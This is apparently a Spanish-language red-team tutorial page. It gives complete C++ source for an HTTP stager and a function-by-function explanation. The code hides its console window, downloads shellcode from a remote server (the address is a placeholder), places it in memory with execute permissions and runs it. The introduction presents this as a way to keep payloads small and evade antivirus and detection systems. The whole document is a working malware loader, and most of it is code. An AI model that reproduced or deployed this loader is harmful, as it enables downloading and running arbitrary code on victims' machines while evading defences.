# Stager HTTP  C++

Un stager, a diferencia de las técnicas mostradas en shellcode execution, es un payload que no contiene el shellcode en sí, sino que se encarga de descargar el shellcode desde un servidor y ejecutarlo posteriormente en la máquina víctima. Esto trae diversas ventajas, ya que el peso del payload es muy inferior al de un stageless. También ayuda a evitar la detección de antivirus y sistemas de detección.



## Código

```cpp
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")


struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode);

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE); 

	Shellcode shellcode = Download(L"<ip-file-server>", <port-file-server>);
	Execute(shellcode);

	return 0;
}

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"<file-name>",
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		//printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0); // HTTP requests eventually failed
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			//printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

void Execute(Shellcode shellcode) {
	void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((void(*)())exec)();
}
```



## Explicación

### Declaración de funciones

El código empieza declarando una **estructura Shellcode** que contiene un arreglo de bytes junto a la longitud del mismo.

```c
struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode);
```

Después se definen dos prototipos de funciones, **Download** que devuelve una estructura shellcode y otra función **Execute** que no devuelve nada pero acepta como parámetros esta estructura.  Los prototipos de función permiten su uso en el bloque **main()** antes de su declaración.



### Bloque Main

En esta parte es cuando se utilizan las funciones previamente declaradas, y antes de eso se coloca **::ShowWindow(::GetConsoleWindow(), SW\_HIDE)** para ocultar la consola. En la función **Download()** se especifica la dirección ip o nombre de dominio del server de donde se descargará el shellcode junto a su puerto.



### Función Download

Las principales funciones que componen a Download son las siguientes:

{% code lineNumbers="true" %}
```c
Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
    HINTERNET session = InternetOpen(L"<USER-AGENT>", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)
    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0)
    HINTERNET request = HttpOpenRequest(connection, L"GET", L"<shellcode-file-name>", NULL, NULL, NULL, 0, 0)
    
    
    
    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);
}
```
{% endcode %}

**InternetOpen** se encarga de crear un handle HTTP definiendo un User-Agent , este nos va a servir para crear una conexión.

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena" %}

**InternetConnect** en el que le vamos a pasar la sesión creada, junto a la dirección del server y su puerto.&#x20;

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta" %}

Con **HttpOpenRequest** creamos la request http pasandole la conexión creada y el nombre del archivo que vamos a querer descargar el contenido.&#x20;

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta" %}

Para liberar recursos utilizaremos **InternetCloseHandle**  para cerrar los handles anteriormente creados.

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle" %}

Como en primaria instancia puede fallar el realizar la conexión se puede intentar varias veces, esta porción de código se encarga de evaluar si no se envió la solicitud http el reintentar, en este caso hasta 3 veces.

```c
WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		//printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0); // HTTP requests eventually failed
		}
	}
```



Con el siguiente código vamos a leer el contenido del shellcode hosteado por el server, y para almacenar el resultado en la variable payload, como no sabemos el tamaño del shellcode le vamos a asignar **BUFSIZE,** con esto le decimos al compilador que decida cual será el tamaño.

El primer condicional sirve para evaluar si **InternetReadFile** pudo leer data, sino termina la ejecución del proceso.

Con el tercer if validamos si el tamaño del payload es pequeño, lo duplicamos.

Una vez se termine de leer la data con **InternetReadFile,** se encargará de romper el bucle while.

```cpp
	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			//printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);
```

Para retornar este shellcode se define una estructura **Shellcode** (previamente definida) y se retorna este valor

```c
struct Shellcode out;
out.data = payload;
out.len = payloadSize;
return out;
```



### Función Execute

Esta función se encarga de crear un espacio de memoria con el tamaño del shellcode con permisos de lectura, escritura y ejecución.

Después se copia a este espacio de memoria el shellcode que obtuvimos de la función **Download().**

Y por último se convierte el shellcode almacenado en la variable que creamos a una function pointer, y se la llama para ejecutar el shellcode.

```c
void Execute(Shellcode shellcode) {
	void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((void(*)())exec)();
}
```

